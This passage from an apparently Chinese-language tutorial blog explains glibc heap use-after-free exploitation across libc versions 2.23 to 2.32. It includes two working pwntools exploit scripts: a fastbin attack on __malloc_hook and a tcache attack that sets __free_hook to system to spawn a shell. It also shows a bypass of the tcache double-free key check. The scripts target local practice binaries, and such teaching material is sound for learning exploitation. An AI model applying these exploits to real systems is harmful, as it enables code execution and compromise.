class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./UAF_glibc2.23'</span></span><br><span class="line">libc_path = <span class="string">'./libc-2.23.so'</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">()</span>:</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'index'</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">'size'</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">'content:'</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'index'</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">'content:'</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'index'</span>, str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'index'</span>, str(index))</span><br><span class="line"></span><br><span class="line">message = <span class="string">"======================== LEAK LIBC ADDRESS ======================="</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">'2'</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x10</span>, <span class="string">'protect'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">'aaaaaaaa'</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">344</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">success(<span class="string">"libc:&#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line"></span><br><span class="line">message = <span class="string">"======================== FASTBIN ATTACK ======================="</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line">og = libc_base + <span class="number">0xd5bf7</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="number">0x13</span> * <span class="string">b'\x00'</span> + p64(og))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">"======================== TRIGGER MALLOC HOOK ======================="</span></span><br><span class="line">success(message)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendafter(<span class="string">'index'</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendafter(<span class="string">'size'</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="2-27"><a href="#2-27" class="headerlink" title="2.27"></a>2.27</h3><p> libc2.27在更新后，malloc源码发生了变化，基本上和libc2.31的源码一样，引入了key指针来避免double free，所以我们在2.27下的利用手法和2.31下的利用手法基本一致，直接篡改key指针即可绕过检查。</p>
<p> 在老版libc下关于tcache的俩结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p> 从tcache中拿堆块的函数tcache_get()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> free后放入tcache中的函数tcache_put()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> tcache bin和fastbin的管理方式很像，都采用FILO的单链表（理解为数据结构中的栈），但是tcache的优先级更高，并且在bin中，fastbin的fd指针指向上一个chunk的头部，而tcache会指向上一个chunk的数据部分。</p>
<p> 旧版libc2.27中，tcache结构体没有引入key指针，可以随意double free，在UAF下，使得利用手法更为容易，并且在分配的过程中没有对size进行检查，所以在旧版libc2.27下很常见的一种利用手法就是填满tcache后，申请unsorted bin大小的chunk利用UAF进行地址泄露，利用tcache随意double free的特性来修改__free_hook指针为one<em>gadget，原理同\</em>_malloc_hook。</p>
<h3 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h3><p> 在libc2.31中，我们查看tcache的相关结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="comment">// 新引入了key指针</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">// 这个位置很有趣，在libc2.27中的数据结构是char一个字节，libc2.31被更新为uint16_t类型为2个字节了</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p> 从tcache中拿堆块的函数tcache_get()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="comment">// 取出时将key字段设置为NULL</span></span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> free后放入tcache中的函数tcache_put()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> key字段用于检测是否存在double free，在_int_free中有这样一段代码来检测tcache中的double free</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">     tmp;</span><br><span class="line">     tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">    malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don't abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p> 这段代码的意思就是如果key值等于tcache的地址，那么就进入tcache的链表，然后后移，判断当前堆块是否在链表中，如果在链表中，那么很显然就是double free了。绕过方法很简单，利用漏洞改掉key值即可，直接给干掉if判断了，就不会进入这个if分支了。</p>
<p> 在UAF下的利用手法为首先填满tcache，然后申请unsorted bin大小的chunk，利用UAF泄露libc基址，最后通过修改tcache的指针轻松的将堆块申请到__free_hook，修改为system地址，然后free一个chunk，chunk的内容为”/bin/sh\x00”即可轻松getshell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./UAF_glibc2.31'</span></span><br><span class="line">libc_path = <span class="string">'./libc-2.31.so'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">()</span>:</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'index'</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">'size'</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">'content:'</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'index'</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">'content:'</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'index'</span>, str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'index'</span>, str(index))</span><br><span class="line"></span><br><span class="line">message = <span class="string">"======================== LEAK HEAP ADDRESS ======================"</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">'protected'</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x40</span>, <span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">138</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(<span class="string">"LIBC:"</span> + hex(libc_base))</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">message = <span class="string">"======================== TCACHE ATTACK ======================"</span></span><br><span class="line">success(message)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">6</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">'hacker'</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, p64(system))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最后谈一下libc2.27和libc2.31的一些小tips，当我们攻击tcache_perthread_struct时，很常见的一个做法就是来将其记录counts的区域全部覆盖填满，这样我们再次申请的chunk可逃逸出tcache，在libc2.27中counts[TCACHE_MAX_BINS]的类型为char，即在相应size的位置上记录数量的大小是一个字节，而在libc2.31中相应的类型为uint16_t，大小是两个字节，所以我们之前的payload通常是<code>b&quot;\x07&quot; * 0x40</code>（从trcache_perthread_struct的数据区开始填充），在libc2.31中，payload需要改写成<code>b&quot;\x07&quot; * 0x80</code>，因为大小多了一倍，也相应的需要增加padding。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/t0124c7d42dacc9a545.png" alt="img"></p>
<h3 id="2-32"><a href="#2-32" class="headerlink" title="2.32"></a>2.32</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><ul>
<li>源码下载<a href="https://ftp.gnu.org/gnu/glibc/" target="_blank" rel="noopener">https://ftp.gnu.org/gnu/glibc/</a></li>
</ul>
<p>下载好源码后新建一个文件夹用于存放源码</p>
<p>新建一个文件夹用于存放编译后的libc</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /glibc/glibc-2.32_src/           # 源码在这</span><br><span class="line">sudo mkdir build</span><br><span class="line">cd build </span><br><span class="line">CFLAGS="-g -g3 -ggdb -gdwarf-4 -Og"</span><br><span class="line">CXXFLAGS="-g -g3 -ggdb -gdwarf-4 -Og"</span><br><span class="line">sudo ../configure --prefix=/glibc/2.32/            # 存放编译后的libc</span><br></pre></td></tr></table></figure>

<p> 若想调试malloc和free的过程，进入gdb后<code>directory /glibc/glibc-2.32_src/malloc/</code>，其中第二个位置填我们下载的glibc源码路径。</p>
<p> 记得binary程序需要使用patchelf修改ld加载器和libc</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter /glibc/2.32/lib/ld-2.32.so</span><br><span class="line">LD_PRELOAD=/glibc/2.32/lib/libc-2.32.so ./binary</span><br></pre></td></tr></table></figure>

<h4 id="跟踪调试"><a href="#跟踪调试" class="headerlink" title="跟踪调试"></a>跟踪调试</h4><p> 我们简单写一个malloc和free的demo示例程序，使用gdb来调试malloc和free的过程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* p[<span class="number">20</span>];</span><br><span class="line">    p[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    p[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(p[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(p[<span class="number">1</span>]);</span><br><span class="line">    p[<span class="number">2</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">In file: /<span class="built_in">home</span>/lemon/Documents/pwn/UAF/<span class="number">2.32</span>/tcache_32.c</span><br><span class="line">    <span class="number">3</span> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    4 </span>&#123;</span><br><span class="line">    <span class="number">5</span>     <span class="keyword">void</span>* p[<span class="number">20</span>];</span><br><span class="line">    <span class="number">6</span>     p[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="number">7</span>     p[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> ►  <span class="number">8</span>     <span class="built_in">free</span>(p[<span class="number">0</span>]);</span><br><span class="line">    <span class="number">9</span>     <span class="built_in">free</span>(p[<span class="number">1</span>]);</span><br><span class="line">   <span class="number">10</span>     p[<span class="number">2</span>] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">   <span class="number">11</span> &#125;</span><br></pre></td></tr></table></figure>

<h5 id="free过程"><a href="#free过程" class="headerlink" title="free过程"></a>free过程</h5><p> 我们定位到第八行后，按s步入free的过程</p>
<p><a href="https://p1.ssl.qhimg.com/t019f7a3a46994557d2.png" target="_blank" rel="noopener"><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/t019f7a3a46994557d2.png" alt="img"></a></p>
<p> 一直走到_int_free函数，步入此函数</p>
<p><a href="https://p1.ssl.qhimg.com/t0119303f5a75895c90.png" target="_blank" rel="noopener"><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/t0119303f5a75895c90.png" alt="img"></a></p>
<p> 向后运行，准备调用tcache_put函数将当前准备free的chunk放入tcache结构体中</p>
<p><a href="https://p2.ssl.qhimg.com/t01104c97d83d12a984.png" target="_blank" rel="noopener"><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/t01104c97d83d12a984.png" alt="img"></a></p>
<p> tcache相关的结构体如下，可以发现其实相对于libc-2.31的代码tcache结构体没有发生变化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   